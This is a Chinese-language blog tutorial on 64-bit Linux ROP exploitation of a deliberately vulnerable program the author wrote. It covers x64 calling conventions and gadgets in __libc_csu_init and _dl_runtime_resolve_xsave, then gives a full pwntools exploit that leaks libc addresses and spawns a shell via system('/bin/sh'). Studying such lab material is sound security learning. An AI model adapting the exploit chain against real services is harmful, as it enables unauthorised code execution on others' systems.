---
layout: post
title: "linux_64 ROP exploit"
---

#### 0x00 前言 ####

[DynELF && ROP](https://pench3r.github.io/2018/03/30/dynelf-rop.html)和[ret2libc && ROP](https://pench3r.github.io/2018/03/30/ret2libc-rop.html)都是基于32位进行的栈溢出漏洞利用，这篇文章会介绍在64位系统下的栈溢出漏洞利用

- 环境： kaili 2017.2   64位
- 工具： pwntools  peda

安全机制只开启`NX`和`ASLR`

漏洞程序 vul.c

    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>

    void vul_func() {
        char msg[128];
        read(STDIN_FILENO, msg, 512);
    }

    int main(int argc, char *argv[]) {
        vul_func();
        write(STDOUT_FILENO,"ROP test\n", 9); 
        return 0;
    }



编译： `gcc -g -no-pie -fno-stack-protector -o vul64 vul.c`

由于64位的系统默认会开启`PIE`功能，所以编译时需要手动添加关闭。

#### 0x01 32位于64位的区别 ####

`x86`和`x86_64`的主要区别有2个：

地址范围的变化，32位地址范围和64位的地址范围，并且x64位所能使用的内存范围不能超过`0x00007fffffffffff`
参数传递方式的变化，32位的参数都是通过栈来传递，但是64位的参数是栈和寄存器配合传参，并且前面的参数是依次通过`rdi`，`rsi`，`rdx`，`rcx`，`r8`和`r9`等方式，剩下的通过栈来传递。

下图是引用[另外一篇博客](https://eli.thegreenplace.net/2011/09/06/stack-frame-layout-on-x86-64)，来说明x64位调用的方式

![linux64rop]({{ '/images/201804/linux_64_rop_1_1.png' | prepend: site.baseurl }})

#### 0x02 通用的gadget ####

x64中最常用ROP的是属于`__libc_csu_init`，但是由于它能控制的参数有限，以及参数的位数并非64位的，所以我们还需要扩充我们的资源，看还有那些可以构造`payload`的函数，以下为一些常见的函数可以利用的

- _init
- _start
- call\_gmon\_start
- deregister\_tm\_clones
- register\_tm\_clones
- \_\_do\_global\_dtors\_aux
- frame\_dummy
- \_\_libc\_csu\_init
- \_\_libc_csu_fini
- _fini

上面的这些函数的地址都是保存在程序的`.text`区段中，所以地址不会改变(如果没有开启`PIE`)。

当然会有一些动态加载的库中有比较好用的`ROP`，前提是可以泄露出地址这样才能计算出函数的实际地址,例如`_dl_runtime_resolve_xsave`([蒸米的文章](http://cb.drops.wiki/drops/papers-7551.html)中介绍的是`_dl_runtime_resolve`，我的系统里没有找到可能是库的版本不同)



#### 0x03 漏洞利用 ####

漏洞的利用依然是基于栈溢出漏洞来演示，我们通过基于已知的`libc.so`文件来计算函数的偏移，并通过`write`函数来`leak`内存地址，思路都在前言里面的2篇文章做过介绍，唯一的差别就是传递参数我们不能再直接通过栈来传递，需要找`ROP`，例如`pop rdi, pop rsi, ret`来进行参数传递

我们利用的目的依然还是调用`system`,来执行`/bin/sh`

<strong>第一种方法`__libc_csu_init`：</strong>

首先获取内存地址，根据偏移来计算`system`的地址和`/bin/sh`的地址，由于使用ROPgadget并没有搜索到满足我们需求的`ROP`，但是在libc.so中，__libc_csu_init中提供了很有效的ROP链,使用`objdump -d -M intel vul64`查看关于`__libc_csu_init`

<pre>0000000000400590 __libc_csu_init:
  400590:   41 57                   push   r15 
  400592:   41 56                   push   r14 
  400594:   49 89 d7                mov    r15,rdx
  400597:   41 55                   push   r13 
  400599:   41 54                   push   r12 
  40059b:   4c 8d 25 6e 08 20 00    lea    r12,[rip+0x20086e]        # 600e10 __frame_dummy_init_array_entry  4005a2:   55                      push   rbp
  4005a3:   48 8d 2d 6e 08 20 00    lea    rbp,[rip+0x20086e]        # 600e18 __init_array_end
  4005aa:   53                      push   rbx 
  4005ab:   41 89 fd                mov    r13d,edi
  4005ae:   49 89 f6                mov    r14,rsi
  4005b1:   4c 29 e5                sub    rbp,r12
  4005b4:   48 83 ec 08             sub    rsp,0x8
  4005b8:   48 c1 fd 03             sar    rbp,0x3
  4005bc:   e8 3f fe ff ff          call   400400 
  4005c1:   48 85 ed                test   rbp,rbp
  4005c4:   74 20                   je     4005e6 
  4005c6:   31 db                   xor    ebx,ebx
  4005c8:   0f 1f 84 00 00 00 00    nop    DWORD PTR [rax+rax*1+0x0]
  4005cf:   00  
  4005d0:   4c 89 fa                mov    rdx,r15
  4005d3:   4c 89 f6                mov    rsi,r14
  4005d6:   44 89 ef                mov    edi,r13d
  4005d9:   41 ff 14 dc             call   QWORD PTR [r12+rbx*8]
  4005dd:   48 83 c3 01             add    rbx,0x1
  4005e1:   48 39 dd                cmp    rbp,rbx
  4005e4:   75 ea                   jne    4005d0 
  4005e6:   48 83 c4 08             add    rsp,0x8
  4005ea:   5b                      pop    rbx 		# 必须为0
  4005eb:   5d                      pop    rbp 		# 必须为1
  4005ec:   41 5c                   pop    r12 		# function call
  4005ee:   41 5d                   pop    r13 		# arg1
  4005f0:   41 5e                   pop    r14 		# arg2
  4005f2:   41 5f                   pop    r15 		# arg3
  4005f4:   c3                      ret</pre>       

可以看到从`0x4005ea`开始，就依次将栈上的数据弹入到`rbx`, `rbp`, `r12`, `r13`, `r14`, `r15`中，在`0x4005d0`，又将`r15`传递给`rdx`(函数的第三个参数)，`r14`传递给`rsi`(函数的第二个参数)，`r13`传递给`edi`(函数的第1个参数)，随后通过`call   QWORD PTR [r12+rbx*8]`来调用函数，`r12`和`rbx`我们也是可以控制。后续会判断rbp，rbx是否相等，如果相等就会继续执行下面的`pop`并且`ret`就可以执行另外一个函数。 这样`libc.so`提供的`ROP`完全满足我们的需求，只是构造会比较麻烦一点。该库是在所有的`elf64`的程序里面都会加载的.

通过上面的信息作为基础，我们先构造`payload1`功能主要是调用`write`函数，并将`1(STDOUT_FILENO)`,`write@got`,`8(len)`3个参数进行传递获取到内存中write函数的地址
<pre>payload1 = "\x90"*payload_len + (return_addr=__libc_csu_init+5a=0x4005ea) + (rbx=0) + (rbp=1)
payload1 += (r12=write_got) + (r13=1) + (r14=write_got) + (r15=8) + (0x4005d0)	# write函数的调用
payload1 += "b"*56 + (return_addr=main) # 当write函数调用结束后，会继续pop6次，所以返回地址设置到程序的主函数进行payload2发送</pre>

获取到`write_addr`的内存地址后，通过偏移开始计算`system`的偏移地址，由于通过`__libc_csu_init`的ROP我们控制的第一个参数只能保存在`edi`，`32`位的空间所以无法直接使用`libc.so`中的`/bin/sh`的内存地址因为它是64位的,所以这里还要再加一层`payload`，通过`read`函数将`/bin/sh`写入到`.bss`段中(因为地址位数比较小，所以可以通过edi来传递)。
<pre>write_addr = u64(p.recv(8))
system_addr = write_addr - (libc.symbols['write'] - libc.symbols['system'])</pre>

在获取到`system`地址后，我们需要通过`read`函数将`/bin/sh`写入到程序的`.bss`段中，这样方便我们将该地址传入到`edi`，调用`system`函数拿到`shell`.这个具体的构造可以参照[蒸米的这篇文章](http://cb.drops.wiki/drops/papers-7551.html)来进行操作

<strong>第二种`_dl_runtime_resolve_xsave`:</strong>

<pre>0x00007ffff7ded240 +0:	push   rbx
   0x00007ffff7ded241 +1:	mov    rbx,rsp
   0x00007ffff7ded244 +4:	and    rsp,0xffffffffffffffc0
   0x00007ffff7ded248 +8:	sub    rsp,QWORD PTR [rip+0x20f5b9]        # 0x7ffff7ffc808 _rtld_global_ro+168
   0x00007ffff7ded24f +15:	mov    QWORD PTR [rsp],rax
   0x00007ffff7ded253 +19:	mov    QWORD PTR [rsp+0x8],rcx
   0x00007ffff7ded258 +24:	mov    QWORD PTR [rsp+0x10],rdx
   0x00007ffff7ded25d +29:	mov    QWORD PTR [rsp+0x18],rsi
   0x00007ffff7ded262 +34:	mov    QWORD PTR [rsp+0x20],rdi
   0x00007ffff7ded267 +39:	mov    QWORD PTR [rsp+0x28],r8
   0x00007ffff7ded26c +44:	mov    QWORD PTR [rsp+0x30],r9
   0x00007ffff7ded271 +49:	mov    eax,0xee
   0x00007ffff7ded276 +54:	xor    edx,edx
   0x00007ffff7ded278 +56:	mov    QWORD PTR [rsp+0x240],rdx
   0x00007ffff7ded280 +64:	mov    QWORD PTR [rsp+0x248],rdx
   0x00007ffff7ded288 +72:	mov    QWORD PTR [rsp+0x250],rdx
   0x00007ffff7ded290 +80:	mov    QWORD PTR [rsp+0x258],rdx
   0x00007ffff7ded298 +88:	mov    QWORD PTR [rsp+0x260],rdx
   0x00007ffff7ded2a0 +96:	mov    QWORD PTR [rsp+0x268],rdx
   0x00007ffff7ded2a8 +104:	mov    QWORD PTR [rsp+0x270],rdx
   0x00007ffff7ded2b0 +112:	mov    QWORD PTR [rsp+0x278],rdx
   0x00007ffff7ded2b8 +120:	xsave  [rsp+0x40]
   0x00007ffff7ded2bd +125:	mov    rsi,QWORD PTR [rbx+0x10]
   0x00007ffff7ded2c1 +129:	mov    rdi,QWORD PTR [rbx+0x8]
   0x00007ffff7ded2c5 +133:	call   0x7ffff7de6630 _dl_fixup
   0x00007ffff7ded2ca +138:	mov    r11,rax
   0x00007ffff7ded2cd +141:	mov    eax,0xee
   0x00007ffff7ded2d2 +146:	xor    edx,edx
   0x00007ffff7ded2d4 +148:	xrstor [rsp+0x40]		# dl_runtime_resolve 是没有这条指令
   0x00007ffff7ded2d9 +153:	mov    r9,QWORD PTR [rsp+0x30]
   0x00007ffff7ded2de +158:	mov    r8,QWORD PTR [rsp+0x28]
   0x00007ffff7ded2e3 +163:	mov    rdi,QWORD PTR [rsp+0x20]
   0x00007ffff7ded2e8 +168:	mov    rsi,QWORD PTR [rsp+0x18]
   0x00007ffff7ded2ed +173:	mov    rdx,QWORD PTR [rsp+0x10]
   0x00007ffff7ded2f2 +178:	mov    rcx,QWORD PTR [rsp+0x8]
   0x00007ffff7ded2f7 +183:	mov    rax,QWORD PTR [rsp]
   0x00007ffff7ded2fb +187:	mov    rsp,rbx
   0x00007ffff7ded2fe +190:	mov    rbx,QWORD PTR [rsp]
   0x00007ffff7ded302 +194:	add    rsp,0x18
   0x00007ffff7ded306 +198:	bnd jmp r11</pre>

从上图的`_dl_runtime_resolve_xsave`汇编代码中可以看到，从`0x00007ffff7ded2d9`开始，我们可以一次控制所有寄存器的参数，最后通过`jmp r11`进行函数调用，而`r11`可以在`0x00007ffff7ded2ca`由`rax`传入。

总体的思路还是通过调用`system`函数将`/bin/sh`的字符串的地址传入，这2个地址都通过在`libc.so`中的偏移来计算

    payload1 = "\x90"*136 + (return_addr=__libc_csu_init+5a=0x4005ea) + (rbx=0) + (rbp=1)
    payload1 += (r12=write_got) + (r13=1) + (r14=write_got) + (r15=8) + (0x4005d0)
    payload1 += "b"*56 + (return_addr=main)

测试功能正常：

![linux64rop]({{ '/images/201804/linux_64_rop_3_1.png' | prepend: site.baseurl }})

`payload1`我们就可以成功获取到`system`和`/bin/sh`的地址，以及`libc`的基地址,接下来我们需要调用`system`函数，首先通过`pop rax;ret`将system的地址传入到rax，之后再跳转到`0x00007ffff7ded2ca`将`rax`传入`r11`,所以我们还需要获取`_dl_runtime_resolve_xsave`的基地址，可以通过程序的`plt`表中的`_GLOBAL_OFFSET_TABLE_+0x10`获取

![linux64rop]({{ '/images/201804/linux_64_rop_3_2.png' | prepend: site.baseurl }})

构造payload2获取`_dl_runtime_resolve_xsave`的基地址.

    payload2 = "\x90"*136 + (return_addr=__libc_csu_init+5a=0x4005ea) + (rbx=0) + (rbp=1)
    payload2 += (r12=write_got) + (r13=1) + (r14=_dl_runtime_resolve_xsave=0x601010) + (r15=8) + (0x4005d0)
    payload2 += "b"*56 + (return_addr=main)
    
最后一步基于我们所有获取到的信息开始调用`system`获取`shell`

    payload3 = "\x90"*136 + (return_addr=pop_rax_ret_addr) + (system_addr) + (_dl_runtime_resolve_xsave+138) 
    payload3 += (rax=0) + (rcx=0) + (rdx=0) + (rsi=0) + (binsh_addr) + (r8) + r(r9)

这个就是payload3的基本布局.

一切都准备就绪，但是不知道什么原因在执行到`0x00007ffff7ded2d4 <+148>:	xrstor [rsp+0x40]`程序直接退出，而且正常应该是执行`_dl_runtime_resolve`, 但是我换了2个环境分别是`_dl_runtime_resolve_xsave`和`_dl_runtime_resolve_avx`。均无法正常执行payload， 如果是正常的`_dl_runtime_resolve`可定可以拿到shell的

所以我这里就另外构造了一个payload4来继续完成x64环境的利用，通过`ROPgadget`命令

	ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6  --only 'pop|ret'

意外发现了`pop rdi;ret`,这条指令是在`init_cacheinfo+239`。

![linux64rop]({{ '/images/201804/linux_64_rop_3_3.png' | prepend: site.baseurl }})

再配合着`_init`中的`call rax`和`pop rax;ret`，就可以成功调用`system`函数

![linux64rop]({{ '/images/201804/linux_64_rop_3_4.png' | prepend: site.baseurl }})

因此最终我们的payload4为：

    payload4 = "\x90"*136 + (return_addr=pop_rax_ret) + (system_addr)
    payload4 += (pop_rdi_ret) + (binsh_addr)
    payload4 += (call_rax)

最终整合所有的payload，利用脚本如下(payload3在脚本中没有使用)：

<pre>#!/usr/bin/python

from pwn import *

p = process('./vul64')
#p = remote('127.0.0.1', 10000)
elf = ELF('./vul64')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

#context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
#gdb.attach(proc.pidof(p)[0], gdbscript="b * 0x0400557\nc\n")

pop_rax_ret_off = 0x00000000000380b8  # pop rax; ret
write_plt = elf.symbols['write']
write_got = elf.got['write']
print "[+] the write got address is " + hex(write_got)
main = elf.symbols['main']
print "[+] the main address is " + hex(main)

payload_len = 136  # pattern_create and pattern_offset

p6_ret = elf.symbols['__libc_csu_init'] + 0x5A
print "[+] The libc csu init function " + hex(p6_ret)

# payload to acquire the write function address
payload1 = "\x90"*payload_len + p64(p6_ret) + p64(0) + p64(1)
payload1 += p64(write_got) + p64(1) + p64(write_got) + p64(8)
payload1 += p64(0x4005d0)
payload1 += "A"*56
payload1 += p64(main)

p.send(payload1)

sleep(1)
write_addr = u64(p.recv(8))
print "[+] the write function address is " + hex(write_addr)

libc_base = write_addr - libc.symbols['write']
print "[+] the libc base address is " + hex(libc_base)
system_addr = write_addr - (libc.symbols['write'] - libc.symbols['system'])
print "[+] the system function address is " + hex(system_addr)
binsh_addr = write_addr - (libc.symbols['write'] - next(libc.search('/bin/sh')))
print "[+] the /bin/sh string address is " + hex(binsh_addr)
pop_rax_ret = libc_base + pop_rax_ret_off  # pop rax; ret
print "[+] the pop rax; ret address is " + hex(pop_rax_ret)
pop_rdi_ret_off = 0x02144f
pop_rdi_ret = libc_base + pop_rdi_ret_off  # 0x000000000002144f : pop rdi ; ret
print "[+] the pop rdi; ret address is " + hex(pop_rdi_ret)
call_rax = 0x400410  # _init call rax;


# payload2 to acquire the dl_runtime_resolve_xsave address
dl_runtime_got = 0x601010
payload2 = "\x90"*payload_len + p64(p6_ret) + p64(0) + p64(1)
payload2 += p64(write_got) + p64(1) + p64(dl_runtime_got) + p64(8)
payload2 += p64(0x4005d0)
payload2 += "A"*56
payload2 += p64(main)

p.send(payload2)

sleep(1)
dl_runtime_resolve_xsave = u64(p.recv(8))
print "[+] the dl_runtime_resolve_xsave base address is " + hex(dl_runtime_resolve_xsave)

# payload3 to get shell use dl_runtime_resolve_xsave
# not use
payload3 = "\x90"*136 + p64(pop_rax_ret) + p64(system_addr) + p64(dl_runtime_resolve_xsave+49)
payload3 += p64(0) + p64(0) + p64(0) + p64(0) # rax=rcx=rdx=rsi=0
payload3 += p64(binsh_addr)
payload3 += p64(0) + p64(0) # r8=r9=0
payload3 += p64(0) + p64(0x0000002000000000) + p64(0) # xrstor [rsp+0x40]; 0x0000002000000000   0x0000000000000000

# payload4 to get shell use simple rop
payload4 = "\x90"*136 + p64(pop_rax_ret) + p64(system_addr)
payload4 += p64(pop_rdi_ret) + p64(binsh_addr)
payload4 += p64(call_rax)

print "[*] Begin to get shell..."
p.send(payload4)
p.interactive()</pre>

测试运行

![linux64rop]({{ '/images/201804/linux_64_rop_3_5.png' | prepend: site.baseurl }})

#### 0x04 总结 ####

在这次实践中，可能是由于环境问题无法完美的进行x64的利用，不过核心思路已经是明确，主要是通过内置的ROP，再配合内存地址泄漏，可以控制大部分的参数，最后调用函数，在蒸米的文章中还有介绍[调用mmap来执行任意shellcode](http://cb.drops.wiki/drops/binary-10638.html)(例如msf的反弹shell)

目前为止[Linux Simple Stack overflow](https://pench3r.github.io/2018/03/28/linux-simple-stack-overflow.html)、[DynELF && ROP](https://pench3r.github.io/2018/03/30/dynelf-rop.html)和[ret2libc && ROP](https://pench3r.github.io/2018/03/30/ret2libc-rop.html)介绍了基本的栈溢出漏洞的原理、ret2libc利用技术、应用程序常见的安全机制、ROP的构建和寻找、pwntools工具的使用、DynELF模块的使用、x86于x86_64位的区别、x64位如何通过ROP进行shellcode调用等技术，都算是一些基础算是pwn的基础出门了，了解这些后方便后续的学习，也会通过一些ctf的pwn题目做实战。

#### 0x05 踩过的坑 ####

- 程序接收的输入长度，影响自己的payload(这个在实践x64的时候大意没有考虑到，导致自己的payload总是差1字节)；
- 对于一些填充字节的计算一定要仔细(之前填充的字节少了一个x导致变成了多字符，而不是1个字节)
- 参考别人文章的时候可能工具的更新导致使用方法改变(查看官方手册去解决问题，准确效率高)
- 对于一些莫名的问题，需要多去搜集信息试错(在DynELF中的leak函数中之前一直设置成为vul_func，但是一直失败，设置成为main函数后就成功了)
- 多使用gdb来进行细节的追踪(可以发现自己错在哪里，很重要的一点)
- 使用msf生成payload如果测试失败，尝试再生成一个(每次生成的不太一样，可能由于你的payload中存在你不了解的错误字节导致)

以上总结的都是一些小问题，通过这些东西不断优化自己的细节，因为软件漏洞调试真的细节太多了!!!

KEEP GOING! :P









